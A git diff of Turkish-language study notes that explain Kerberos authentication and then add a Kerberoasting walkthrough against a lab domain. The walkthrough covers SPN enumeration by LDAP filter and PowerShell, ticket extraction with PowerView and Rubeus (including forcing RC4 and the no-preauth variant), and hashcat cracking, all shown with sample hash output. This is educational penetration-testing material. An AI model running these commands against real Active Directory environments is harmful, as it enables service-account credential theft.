@@ -47,7 +47,7 @@ Aşağıdaki bölüm, **Kerberos authentication** sürecini ayrıntılı olarak 
 
 **KDC**, tüm hesapların kimlik bilgilerini bilen varlıktır.
 
-![Pasted image 20250215171009.png](/img/user/Pasted%20image%2020250215171009.png)
+![Pasted image 20250215171009.png](/img/user/resimler/Pasted%20image%2020250215171009.png)
 
 **Kerberos protocol**'ünün nasıl çalıştığını tam olarak anlamak ve ne için kullanıldığını görmek üzere detaylara ineceğiz.
 
@@ -75,7 +75,7 @@ Yüksek seviyede bir perspektiften, bir kullanıcının bir servise nasıl eriş
     
 3. Artık kullanıcı, belirli bir servis için bir **TGS ticket**'ına sahip olduğunda, bu **TGS ticket**'ını servise sunar. Servis, bu **ticket**'ın geçerliliğini kontrol eder ve her şey yolundaysa, kullanıcının bilgilerini okuyarak, kullanıcının talep edilen servisi kullanma yetkisi olup olmadığını belirler. Dolayısıyla, `service, kullanıcının erişim haklarını kontrol eder`.
 
-![Pasted image 20250215171650.png](/img/user/Pasted%20image%2020250215171650.png)
+![Pasted image 20250215171650.png](/img/user/resimler/Pasted%20image%2020250215171650.png)
 
 
 ### Ticket Protection
@@ -90,7 +90,7 @@ Her hesabın bir şifresi veya gizlisi vardır, bu da bir **encryption** ve **de
     
 2. **KDC**'nin kullanıcıya gönderdiği **`TGS ticket`**, `service'in private key'`iyle şifrelenir. Aynı şekilde, kullanıcı **service key**'ini bilmediği için, **`TGS ticket`**'ındaki bilgileri değiştiremez. Diğer taraftan, bu **TGS ticket**'ını servise gönderdiğinde, servis, **ticket**'ın içeriğini şifre çözerek kullanıcının bilgilerini okuyabilir.
 
-![Pasted image 20250215172532.png](/img/user/Pasted%20image%2020250215172532.png)
+![Pasted image 20250215172532.png](/img/user/resimler/Pasted%20image%2020250215172532.png)
 
 
 ### Teknik Detaylar
@@ -113,7 +113,7 @@ Her hesabın bir şifresi veya gizlisi vardır, bu da bir **encryption** ve **de
 
 Kimliklerini kanıtlamak için kullanıcı, bir **`authenticator`** gönderir. Bu, kullanıcının kendi **private key**'iyle şifreleyeceği mevcut **time stamp**'tir. Kullanıcı adı da açık metin olarak gönderilir, böylece **KDC** kiminle işlem yapıldığını anlayabilir.
 
-![Pasted image 20250215173404.png](/img/user/Pasted%20image%2020250215173404.png)
+![Pasted image 20250215173404.png](/img/user/resimler/Pasted%20image%2020250215173404.png)
 
 Bu isteği aldıktan sonra, **KDC** kullanıcı adını alacak, ilişkili anahtarı dizininde arayacak ve **authenticator**'ı şifre çözüp çözmediğini kontrol edecektir. Eğer başarılı olursa, bu, kullanıcının kendi **private key**'ini veritabanında kayıtlı olanla aynı şekilde kullandığı anlamına gelir ve kimlik doğrulaması yapılmış olur. Aksi takdirde, kimlik doğrulaması başarısız olur.
 
@@ -132,7 +132,7 @@ Kalan tüm değiş tokuşları korumak için, **KDC** kullanıcıya yanıt verme
     
 2. İkinci olarak, **`session key`** vardır, ancak bu sefer `kullanıcının anahtarı` ile korunmuş bir şekilde.
 
-![Pasted image 20250215173834.png](/img/user/Pasted%20image%2020250215173834.png)
+![Pasted image 20250215173834.png](/img/user/resimler/Pasted%20image%2020250215173834.png)
 
 Bu nedenle, bu **session key** yanıt içinde iki kez yer alır—bir versiyonu **KDC**'nin anahtarı ile korunur, diğeri ise kullanıcının anahtarı ile korunur.
 
@@ -154,7 +154,7 @@ Kullanıcının bir sonraki adımı, bir **Service Ticket (ST)** veya **TGS tick
 2. Önceden aldıkları **TGT**, içinde kullanıcı bilgileri ve **session key**'in bir kopyası bulunan
 3. Bu noktada **session key** kullanılarak şifrelenmiş bir **authenticator**
 
-![Pasted image 20250215175149.png](/img/user/Pasted%20image%2020250215175149.png)
+![Pasted image 20250215175149.png](/img/user/resimler/Pasted%20image%2020250215175149.png)
 
 
 ### Response (TGS-REP)
@@ -180,7 +180,7 @@ Kullanıcı, şimdi bu yanıtı çözerek **user/service session key**'i ve **TG
 
 Kullanıcı sadece bu **TGS ticket**'ı **service**'e iletecek ve tıpkı **TGS request**'te olduğu gibi bir **authenticator** ekleyecektir. Kullanıcı bu **authenticator**'ı neyle şifreleyecek? Tahmin ettiğiniz gibi, yeni çıkardığı **user/service session key** ile. Bu süreç, önceki **TGS request**'iyle oldukça benzerdir.
 
-![Pasted image 20250215175652.png](/img/user/Pasted%20image%2020250215175652.png)
+![Pasted image 20250215175652.png](/img/user/resimler/Pasted%20image%2020250215175652.png)
 
 
 
@@ -254,13 +254,13 @@ Saldırgan **username** bilgisine sahip olduğunda, KDC'ye (**Key Distribution C
 
 Ayrıca, **TGT** ile birlikte bir **session key** de sağlanır ve bu anahtar kullanıcının **password** bilgisi ile şifrelenmiş şekilde iletilir.
 
-![Pasted image 20250215192322.png](/img/user/Pasted%20image%2020250215192322.png)
+![Pasted image 20250215192322.png](/img/user/resimler/Pasted%20image%2020250215192322.png)
 
 Eğer bir hesapta **pre-authentication** devre dışı bırakılmışsa, bir saldırgan herhangi bir ön kimlik doğrulama gerektirmeden ilgili hesap için şifrelenmiş bir **TGT** elde edebilir. Bu **ticket**'lar, **Hashcat** veya **John the Ripper** gibi araçlar kullanılarak **offline password attack**'lara karşı savunmasızdır.
 
 Özetle, "**Do not require Kerberos preauthentication**" ayarının etkin olduğu herhangi bir hesap için **Ticket Granting Ticket (TGT)** elde etmek mümkündür.
 
-![Pasted image 20250215192409.png](/img/user/Pasted%20image%2020250215192409.png)
+![Pasted image 20250215192409.png](/img/user/resimler/Pasted%20image%2020250215192409.png)
 
 Birçok **vendor installation guide**, **service account**'ın bu şekilde yapılandırılmasını belirtir. **Authentication service reply (AS-REP)**, hesabın şifresiyle şifrelenir ve ağdaki herhangi biri bunu talep edebilir.
 
@@ -541,3 +541,424 @@ AS-REPRoasting, Pre-authentication devre dışı bırakılmış hesapların şif
 
 ### Kerberoasting
 
+Kerberoasting, bir saldırganın servis hesapları üzerinde çevrimdışı parola kırma saldırısı gerçekleştirmesine olanak tanıyan, Active Directory hesabına yönelik bir saldırıdır. Bu saldırı, ASREPRoasting'e benzer ancak önceden domain'e kimlik doğrulaması yapılmasını gerektirir. Başka bir deyişle, saldırıyı gerçekleştirebilmek için geçerli bir domain kullanıcı hesabı ve parolasına (en düşük ayrıcalıklı olanı bile) veya bir DOMAIN JOINED makinede SYSTEM (veya düşük ayrıcalıklı domain hesabı) **shell**'ine sahip olmanız gerekir. Kerberos **pre-authentication** olmayan hesaplarla ilgili bir durum vardır, bunu bu bölümde daha sonra ele alacağız.
+
+Bir servis kaydedildiğinde, Active Directory'ye bir Service Principal Name (SPN) eklenir ve bu, gerçek bir AD Hesabına ait bir takma addır. Active Directory'de saklanan bilgiler, makine adı, port ve AD Hesabı'nın **hash**'ini içerir. Doğru yapılandırıldığında, bu SPN'lerle "Servis Hesapları" kullanılarak güçlü bir parola garanti altına alınır. Bu hesaplar makine hesapları gibidir ve kendi kendini döndüren parolalara bile sahip olabilir.
+
+SPN'lerin, Servis Hesapları ayarlarının zor olabilmesi ve tüm satıcıların bunları desteklememesi nedeniyle, genellikle User Hesapları'na bağlı olduğunu görmek yaygındır. En kötüsü, servis hesabı, parolayı döndürmeye çalıştığında 30. günde bazı şeyleri bozabilir. Sistem Yöneticileri (ve satıcılar) için temel odak noktası kesintisiz çalışma olduğu için, genellikle "User Hesapları" kullanmaya başvururlar ki bu da, hesabın güçlü bir parola atanması koşuluyla uygundur.
+
+Bir sızma testi sırasında, bir SPN'nin bir user hesabına bağlı olduğu ve parolanın kırılmadığı tespit edilirse, bu durum düşük öncelikli bir bulgu olarak işaret edilmeli ve bu, saldırganların çevrimdışı parola kırma saldırıları gerçekleştirmesine olanak tanıyacak şekilde not edilmelidir. Buradaki potansiyel risk, bir gün bu hesabın parolasının, bir saldırganın kırabileceği kadar zayıf bir hale gelmesidir. Bu örnekte, düşük öncelikli bir bulgunun temel amacı, müşteriye bu tür riskli eylemlerin sonuçlarını öğretmek ve bunların nasıl güvenli bir şekilde yapılabileceğini açıklamaktır.
+
+
+### Technical Details
+
+Önceki bölümlerde, özellikle bir kullanıcının bir **service**'i kullanabilmek için yaptığı **Service Ticket** (ST) isteğiyle **Kerberos**'un nasıl çalıştığını tartıştık.  
+
+**KDC**, **TGS** isteğine yanıt verdiğinde, gönderdiği mesaj şudur:
+
+![Pasted image 20250215200736.png](/img/user/resimler/Pasted%20image%2020250215200736.png)
+Bu mesaj, kullanıcı ile **KDC** arasında paylaşılan oturum anahtarıyla tamamen şifrelenmiştir, bu nedenle kullanıcı bu anahtarı bildiğinden mesajı çözebilir. Ancak, yerleşik **TGS** **ticket** veya **Service Ticket** (ST), **private key** ile şifrelenmiştir. Bu nedenle, kullanıcı, **private key**'le şifrelenmiş bir veri parçasına sahiptir.
+
+Bir kullanıcı, **Active Directory** ortamındaki mevcut tüm servisler için bir **Service Ticket** (ST) talep edebilir ve bu ticketları her bir **service account**'ın **private key**'iyle şifrelenmiş şekilde alabilir.
+
+Şimdi, bir **service account**'ın **private key**'iyle şifrelenmiş bir **Service Ticket** (ST) sahibi olan kullanıcı, şifreyi düz metin olarak geri almak için çevrimdışı bir **brute-force** saldırısı gerçekleştirebilir.
+
+Ancak, çoğu **service**, **machine account**'lar (COMPUTERNAME$) tarafından çalıştırılır ve bu hesapların 120 karakter uzunluğunda rastgele oluşturulmuş şifreleri vardır, bu da **brute-force** saldırılarını pratikte imkansız hale getirir.
+
+Neyse ki, bazen **services**, **user account**'lar tarafından çalıştırılır. İşte bu servisler bizim ilgimizi çekiyor. Bir **user account**'ı, insan tarafından belirlenen bir şifreye sahiptir ve bu şifre, daha tahmin edilebilir olma eğilimindedir. İşte bu hesaplar **Kerberoast** saldırısının hedef aldığı hesaplar olup, **SPN accounts**'lar **RC4** şifreleme algoritmasını kullanacak şekilde ayarlandığında, ticketlar çevrimdışı çok daha kolay çözülebilir. Bazen yalnızca eski, kriptografik olarak güvenli olmayan **RC4** şifreleme algoritmasını kullanan organizasyonlarla karşılaşabiliriz. Diğer yandan, daha olgun organizasyonlar yalnızca **AES** (Advanced Encryption Standard) kullanır ve bu da güçlü bir **password-cracking rig** üzerinde bile kırılması çok daha zor olabilir.
+
+
+### Manual Detection
+
+Sonra, bir **service** sağlayan **user account**'larını (makine hesapları değil) ararız. Bir **service**'i sağlayan bir hesap, bir **Service Principal Name** (veya **SPN**)'ye sahiptir. Bu, bu hesap tarafından sağlanan mevcut **services** listesini gösteren bir LDAP özelliğidir. Eğer bu özellik boş değilse, bu hesap en az bir **service** sunmaktadır.
+
+İşte bir **service** sağlayan **user account**'larını aramak için bir LDAP filtresi:
+
+```
+&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
+```
+
+
+Bu filtre, boş olmayan bir **SPN**'ye sahip kullanıcıların bir listesini döndüren bir filtredir. Küçük bir **PowerShell** script'i, bu hesapları bir ortamda otomatik olarak bulmamıza olanak tanır:
+
+```
+$search = New-Object DirectoryServices.DirectorySearcher( "")
+$search.filter = "(&(objectCategory=person)(objectClass=user)
+(servicePrincipalName=*))"
+$results = $search.Findall()
+foreach($result in $results)
+{
+ $userEntry = $result.GetDirectoryEntry()
+ Write-host "User"
+ Write-Host "===="
+ Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
+ Write-host ""
+ Write-host "SPNs"
+ Write-Host "===="
+ foreach($SPN in $userEntry.servicePrincipalName)
+ {
+ $SPN
+ }
+ Write-host ""
+ Write-host ""
+}
+
+```
+
+Bu script, **Domain Controller**'a bağlanır ve sağladığımız filtreyle eşleşen tüm **objects**'i arar. Her sonuç, bize **object**'in adını (**Distinguished Name**) ve bu hesapla ilişkili **SPN**'lerin listesini gösterir.
+
+```
+PS C:\Users\pixis> .\FindSPNAccounts.ps1
+
+Users
+====
+krbtgt ( CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+kadmin/changepw
+User
+====
+sqldev ( CN=sqldev,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQL_svc_dev/inlanefreight.local:1443
+User
+====
+sqlprod ( CN=sqlprod,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQLSvc/sql01:1433
+User
+====
+sqlqa ( CN=sqlqa,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQL_svc_qa/inlanefreight.local:1443
+User
+====
+sql-test ( CN=sql-test,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQL_svc_test/inlanefreight.local:1443
+
+```
+
+Bu script, **Kerberoastable** hesapların bir listesini elde etmemizi sağlar, ancak bir **TGS** isteği yapmaz ve **brute-force** ile kırabileceğimiz **hash**'i çıkarmaz.
+
+Ayrıca, [**Setspn**](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) **built-in** **Windows** **binary**'sini kullanarak **SPN** hesaplarını arayabiliriz.
+
+
+### Automated Tools
+
+**[PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)**, bir **SPN** ayarlanmış kullanıcıları listelemek ve ardından **Service Ticket** (ST) talep ederek çözülebilir bir **hash** çıkarmak için kullanılabilir. **SPN** ayarlanmış hesapları listelemek için aşağıdaki yöntemi kullanabiliriz:
+
+#### PowerView ile SPN'yi numaralandırma
+
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -SPN
+logoncount : 0
+badpasswordtime : 12/31/1600 8:00:00 PM
+description : Key Distribution Center Service Account
+distinguishedname :
+CN=krbtgt,CN=Users,DC=inlanefreight,DC=local
+objectclass : {top, person, organizationalPerson, user}
+name : krbtgt
+primarygroupid : 513
+objectsid : S-1-5-21-228825152-3134732153-3833540767-
+502
+samaccountname : krbtgt
+admincount : 1
+codepage : 0
+samaccounttype : USER_OBJECT
+showinadvancedviewonly : True
+accountexpires : NEVER
+cn : krbtgt
+whenchanged : 5/4/2022 8:04:31 PM
+instancetype : 4
+objectguid : a68bfed4-1ccf-4b62-8efa-63b32841c05d
+lastlogon : 12/31/1600 8:00:00 PM
+lastlogoff : 12/31/1600 8:00:00 PM
+objectcategory :
+CN=Person,CN=Schema,CN=Configuration,DC=inlanefreight,DC=local
+dscorepropagationdata : {5/4/2022 8:04:31 PM, 5/4/2022 7:49:22 PM,
+1/1/1601 12:04:16 AM}
+serviceprincipalname : kadmin/changepw
+memberof : CN=Denied RODC Password Replication
+Group,CN=Users,DC=inlanefreight,DC=local
+whencreated : 5/4/2022 7:49:21 PM
+iscriticalsystemobject : True
+badpwdcount : 0
+useraccountcontrol : ACCOUNTDISABLE, NORMAL_ACCOUNT
+usncreated : 12324
+countrycode : 0
+pwdlastset : 5/4/2022 3:49:21 PM
+msds-supportedencryptiontypes : 0
+usnchanged : 12782
+<SNIP>
+
+```
+
+Ayrıca, **PowerView**'i doğrudan **Kerberoasting** saldırısını gerçekleştirmek için de kullanabiliriz.
+
+
+### Kerberoasting with PowerView
+
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+
+PS C:\Tools> Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
+
+PS C:\Tools> cat .\tgs.csv "SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHex Stream","Hash" "krbtgt","CN=krbtgt,CN=Users,DC=inlanefreight,DC=local","kadmin/changepw", ,"$krb5tgs$18$*krbtgt$inlanefreight.local$kadmin/changepw*$B6D1ECE203852A0 4E57DFDD47627CDCA$D75AF1139899CA82EDA1CC6B548AACFF04DA9451F6F37E641C44F27A E2BAB86DB49F4913B5D09F447F7EEA97629A3C0FF93063F3B20273D0<SNIP>
+```
+
+Yukarıda gösterilen manuel yöntem yerine, bunu hızlıca gerçekleştirmek için **Invoke-Kerberoast** fonksiyonunu kullanabiliriz.
+
+
+#### Invoke-Kerberoast
+
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+
+PS C:\Tools> Invoke-Kerberoast
+
+SamAccountName : adam.jones
+DistinguishedName : CN=Adam
+Jones,OU=Operations,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : IIS_dev/inlanefreight.local:80
+TicketByteHexStream :
+Hash :
+$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local:80
+*$D7C42CD87BEF69BA275C9642BBEA9022BE3C1<SNIP>
+SamAccountName : sqldev
+DistinguishedName : CN=sqldev,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_dev/inlanefreight.local:1443
+TicketByteHexStream :
+Hash :
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:
+1443*$29A78F89AC24EADBB4532DF066B90F1D808A5<SNIP>
+SamAccountName : sqlqa
+DistinguishedName : CN=sqlqa,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_qa/inlanefreight.local:1443
+TicketByteHexStream :
+Hash :
+$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local:14
+43*$895B5A094F49081330D4AEA7C1254F37EEAD7<SNIP>
+SamAccountName : sql-test
+DistinguishedName : CN=sql-test,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_test/inlanefreight.local:1443
+TicketByteHexStream :
+Hash : $krb5tgs$23$*sqltest$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local:1443*$68F3B218
+22B3C16D272F38A5658E20F580037<SNIP>
+SamAccountName : sqlprod
+DistinguishedName : CN=sqlprod,OU=Service
+Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQLSvc/sql01:1433
+TicketByteHexStream :
+Hash :
+$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01:1433*$EE29DA2458CA
+695EC2EDE568E9918909F7A05<SNIP>
+
+```
+
+
+**Kerberoasting**'i gerçekleştirmek için başka harika (ve hızlı) bir yol da **[Rubeus](https://github.com/GhostPack/Rubeus)** aracını kullanmaktır. **Rubeus**'ün dokümantasyonunda, **[Kerberoasting](https://github.com/GhostPack/Rubeus#kerberoast)** saldırısı için çeşitli seçenekler bulunmaktadır.  
+
+**Rubeus**'u kullanarak tüm mevcut kullanıcıları **Kerberoast** edebiliriz ve **hash**'lerini çevrimdışı kırmak için döndürebiliriz.
+
+
+#### Rubeus ile Kerberoasting
+
+```
+C:\Tools> C:\Tools>Rubeus.exe kerberoast /nowrap
+ ______ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+ v2.2.2
+[*] Action: Kerberoasting
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these
+accounts.
+[*] Target Domain : INLANEFREIGHT.LOCAL
+[*] Searching path
+'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&
+(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)
+(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+[*] Total kerberoastable users : 6
+[*] SamAccountName : sqldev
+[*] DistinguishedName : CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName : MSSQL_svc_dev/inlanefreight.local:1433
+[*] PwdLastSet : 10/14/2022 7:00:06 AM
+[*] Supported ETypes : RC4_HMAC_DEFAULT
+[*] Hash :
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:
+[email
+protected]*$21CF6BFCE5377C1FA957FC340261E6A3$22AC9C6E64F19D4E51E849A99DC4F
+C4FCE819E376045D1310393C7D26A42FFE50607C42A5F5E038E30867855091726D5E21FC0C
+6C49730EA32CE8BF95EB6158D30796D016CCF6BA7E5A8825DECFBD9D619917BC9BF7B2A6E5
+3380563DDC5BF24DDEE8B38D5F869DE6682BA2C762520434027485919F8F364F8B9D84B91C
+3D1EA8EECA64F5C9690276A6211F5CE6C4AEA57ADB06188BE5E538DAC82C3F7EE708188B3E
+4FD452C06FA41022317E97E9B840B93E4A03E7429D60FC4F8EB7546597B516695BDEB010CA
+3FEB5A25E36BEC787044DFB19117616D76DAE523248DF55DC2513C05788B27BCE31A3FF38E
+820F63BB491ECCA2563799C9C4563576B22EEB703E09B68AA95EC50CD234BFDF479027415A
+58C48D024611E281DDD9355FFBF02BA277B10D6D5D347BFB751FA6101FFE915A<SNIP>
+```
+
+Belirli bir kullanıcıyı **Kerberoast** etmek ve sonucu bir dosyaya yazmak için **/outfile:filename.txt** bayrağını da kullanabiliriz.
+
+**/pwdsetafter** ve **/pwdsetbefore** argümanlarını kullanarak, şifresi belirli bir tarihte ayarlanan hesapları **Kerberoast** edebiliriz; bu bize faydalı olabilir, çünkü bazen yıllar önce şifresi belirlenmiş, mevcut password politikası dışında kalan ve nispeten kolayca kırılabilen eski hesaplarla karşılaşabiliyoruz.
+
+**/stats** bayrağını kullanarak, herhangi bir **ticket** isteği göndermeden **Kerberoastable** hesaplar hakkında istatistikler listeleyebiliriz. Bu, bilgi toplamak ve hesap ticketlarının kullandığı şifreleme türlerini kontrol etmek için faydalı olabilir.
+
+**`/tgtdeleg`** bayrağı, **This account supports Kerberos AES 128-bit encryption** veya **This account supports Kerberos AES 256-bit encryption** seçeneklerinin ayarlandığı hesaplarla karşılaştığımız durumlarda faydalı olabilir. Bu, bir **Kerberoasting** saldırısı gerçekleştirdiğimizde, geri dönen **AES-128** (tip 17) veya **AES-256** (tip 18) **TGS tickets** alacağımız anlamına gelir, bu da **RC4** (tip 23) **tickets**'ten çok daha zor kırılabilir. Farkı anlayacağız çünkü **RC4** şifreli bir bilet, **`$krb5tgs$23$`*** önekiyle başlayan bir **hash** döndürecekken, **AES** şifreli ticketlar bize **`$krb5tgs$18$`*** ile başlayan bir **hash** verecektir.
+
+AES şifreleme ile şifrelenmiş hesabın **hash**'ini aldığımız durumlarda (bu daha zor kırılır), **/tgtdeleg** bayrağını **Rubeus** ile kullanarak **RC4** şifrelemesini zorlayabiliriz. Bu, bazı domain'lerde **RC4**'ün eski hizmetlerle geriye dönük uyumluluk için **built-in** bir güvenlik önlemi olarak kullanıldığı durumlarda işe yarayabilir. Başarılı olursa, **AES** şifreli bir **hash**'i kırmaya çalışmaktan çok daha hızlı, dakikalar hatta saatler içinde kırılabilecek bir **password hash** elde edebiliriz.
+
+
+### Hash Cracking
+
+**Rubeus**, farklı **TGS** **tickets** veya **Service Tickets** (ST'ler) ile ilişkilendirilmiş **hash**'lerin listesini döndürür. Geride kalan tek şey, bu hesaplarla ilişkilendirilmiş **clear text** şifreyi almak için **hashcat** kullanmaktır. **Hashcat**'in kullanacağı **hash-mode** 13100'dür (**Kerberos 5, etype 23, TGS-REP**).
+
+### Cracking Kerberoastable Hashes with hashcat
+
+```
+C:\Tools\hashcat-6.2.6> hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O
+
+hashcat (v6.2.6) starting
+OpenCL API (OpenCL 2.1 WINDOWS) - Platform #1 [Intel(R) Corporation]
+====================================================================
+* Device #1: AMD EPYC 7401P 24-Core Processor, 2015/4094 MB (511 MB
+allocatable), 4MCU
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 31
+Hashes: 6 digests; 6 unique digests, 6 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13
+rotates
+Rules: 1
+Optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Not-Iterated
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+Host memory required for this attack: 0 MB
+Dictionary cache hit:
+* Filename..: C:\Tools\rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+$krb5tgs$23$*jacob.kelly$INLANEFREIGHT.LOCAL$SVC/[email protected]*$ac3b7a50ae9b3af123888b5722c56665$cdc909a1608c1fe4e14787df62037 99f26a
+```
+
+### Hesap Parolası olmadan Kerberoasting
+
+Daha önce bahsedildiği gibi, geçerli bir domain hesabı ve şifresi olmadan (**SYSTEM shell**/shell gibi düşük ayrıcalıklı bir hesapla domain'e bağlı bir host üzerinde) **Kerberoasting** saldırısı gerçekleştirebileceğimiz bir durum vardır. Bu, Kerberos ön-iletişim (**pre-authentication**) etkinleştirilmemiş bir hesabı bildiğimizde mümkün olabilir. Bu hesabı kullanarak, bir **TGT** talep etmek için genellikle kullanılan bir **AS-REQ** isteği ile **Kerberoastable** bir kullanıcı için **TGS ticket** talep edebiliriz. Bu işlem, isteğin **req-body** kısmını değiştirerek yapılır ve bu konu detaylı bir şekilde bu yazıda açıklanmaktadır.
+
+Bu saldırıyı gerçekleştirebilmek için aşağıdaki bilgilere ihtiyacımız var:
+
+1. pre-authentication devre dışı bırakılmış bir hesabın kullanıcı adı (**`DONT_REQ_PREAUTH`**).
+2. Hedef **SPN** veya bir **SPN** listesi.
+
+Kimlik doğrulaması olmadığını simüle edebilmek için, **Rubeus createnetonly** komutunu kullanacağız ve saldırıyı gerçekleştirmek için CMD penceresini kullanacağız.
+
+
+### Execute Rubeus createnetonly
+
+```
+C:\Tools> Rubeus.exe createnetonly /program:cmd.exe /show
+ ______ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+ v2.2.2
+[*] Action: Create Process (/netonly)
+[*] Using random username and password.
+[*] Showing process : True
+[*] Username : FQW21FKC
+[*] Domain : KNVRD2SG
+[*] Password : IL6X2VCC
+[+] Process : 'cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID : 6428
+[+] LUID : 0x10885a
+```
+
+Açılan yeni CMD penceresinden saldırıyı gerçekleştireceğiz; **Kerberoast** seçeneğini çalıştırmaya çalışırsak, kimlik doğrulaması yapılmadığı için başarısız olacaktır.
+
+
+### **/nopreauth** olmadan Saldırıyı Gerçekleştirme
+
+```
+C:\Tools> Rubeus.exe kerberoast
+ ______ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+ v2.2.2
+[*] Action: Kerberoasting
+[!] Unhandled Rubeus exception:
+System.DirectoryServices.ActiveDirectory.ActiveDirectoryOperationException
+: Current security context is not associated with an Active Directory
+domain or forest.
+ at
+System.DirectoryServices.ActiveDirectory.DirectoryContext.GetLoggedOnDomai
+n()
+ at
+System.DirectoryServices.ActiveDirectory.DirectoryContext.IsContextValid(D
+irectoryContext context, DirectoryContextType contextType)
+ at System.DirectoryServices.ActiveDirectory.DirectoryContext.isDomain()
+ at
+System.DirectoryServices.ActiveDirectory.Domain.GetDomain(DirectoryContext
+context)
+ at Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)
+ at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName,
+Dictionary`2 arguments)
+ at Rubeus.Program.MainExecute(String commandName, Dictionary`2
+parsedArgs)
+
+```
+
+Şimdi, **DONT_REQ_PREAUTH** ayarı yapılmış bir kullanıcı (örneğin, **amber.smith**) ve bir **SPN** (örneğin, **MSSQLSvc/SQL01:1433**) eklersek, bir **ticket** döndürecektir.
+
+
+### Saldırının /nopreauth ile Gerçekleştirilmesi
+
+```
+C:\Tools> Rubeus.exe kerberoast /nopreauth:amber.smith
+/domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
+ ______ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+ v2.2.2
+[*] Action: Kerberoasting
+[*] Using amber.smith without pre-auth to request service tickets
+[*] Target SPN : MSSQLSvc/SQL01:1433
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
+[*] Hash :
+$krb5tgs$23$*MSSQLSvc/SQL01:1433$inlanefreight.local$MSSQLSvc/SQL01:1433*$
+7E08E831C13A2EEAEA47C13ECD378E8D$D6E591A4AB495AFEE4BD9E893A39C7B9E77C3D775
+9D9923<SNIP> 
+```
+
+Not: Birden fazla SPN denemek için /spn yerine /spns:listofspn.txt kullanabiliriz.
+
+Şimdi, bir Windows host üzerinden **Kerberoasting** nasıl yapılacağını gördük, bundan sonra bir Linux makinesinden nasıl yapılacağına değineceğiz.
+
+
+### Kerberoasting from Linux
